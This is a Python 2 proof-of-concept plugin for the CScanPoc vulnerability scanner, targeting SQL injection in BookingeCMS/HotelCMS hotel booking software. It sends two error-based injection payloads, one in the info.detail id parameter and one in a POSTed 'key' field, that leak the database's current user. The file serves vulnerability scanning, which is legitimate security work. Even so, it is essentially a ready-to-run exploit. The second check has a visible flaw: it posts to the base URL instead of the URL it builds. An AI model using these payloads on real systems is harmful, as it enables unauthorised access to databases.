# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'BookingeCMS_0000' # 平台漏洞编号
    name = 'BookingeCMS SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        BookingeCMS HotelCMS酒店预订管理系统key和m=info.detail id存在注入.py。
    ''' # 漏洞描述
    ref = 'Unknown' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'BookingeCMS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'fe724058-1f7c-42ff-bb8e-69f9568c15bf' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            vulurl = '{target}'.format(target=self.target)
            payload = "/?m=info.detail&id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
            resp = requests.get(vulurl+ payload)
            re_result = re.findall(r'~~~(.*?)~~~', resp.content, re.S|re.I)
            vulurl1 = "%s/?m=city.getSearch&index=xx" % vulurl
            payload1 = {"key":"xxx' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xx'='xx"}
            resp1 = requests.post(vulurl,data=payload1)
            re_result1 = re.findall(r'~~~(.*?)~~~', resp1.content, re.S|re.I)
            if re_result:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            if re_result1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()